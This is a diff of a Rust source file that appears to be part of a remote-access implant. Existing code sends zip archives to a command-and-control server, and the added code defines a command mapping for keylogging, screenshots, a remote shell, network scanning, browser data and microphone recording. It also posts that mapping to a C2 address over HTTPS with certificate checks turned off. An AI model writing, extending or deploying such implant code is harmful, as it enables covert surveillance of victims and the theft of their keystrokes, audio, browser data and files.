@@ -13,6 +13,7 @@ use zip::result::ZipResult;
 use zip::write::SimpleFileOptions;
 use zip::{AesMode, CompressionMethod};
 
+
 enum _Status {
     SUCCESSFUL,
     FAILED,
@@ -22,6 +23,17 @@ struct Directive {
     // id: String,
     command: String,
     // status: String,
+}
+
+#[derive(Serialize)]
+pub struct CommandMapping {
+    pub keylogger: String,
+    pub screenshot: String,
+    pub logs: String,
+    pub shell: String,
+    pub network_scan: String,
+    pub browser_info: String,
+    pub mic_rec: String,
 }
 
 pub async fn send_directive_status(
@@ -171,5 +183,25 @@ pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::E
         .await?;
 
     println!("Status: {}", response.status());
+    Ok(())
+}
+
+
+pub async fn send_mapping(mapping: &CommandMapping) -> Result<(), reqwest::Error> {
+    let client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()?;
+
+    let res = client
+        .post("https://192.168.19.186:3030/mapping")
+        .json(mapping)
+        .send()
+        .await;
+
+    if let Err(e) = res {
+        eprintln!("Erreur lors de l'envoi du mapping : {:?}", e);
+        return Err(e);
+    }
+
     Ok(())
 }
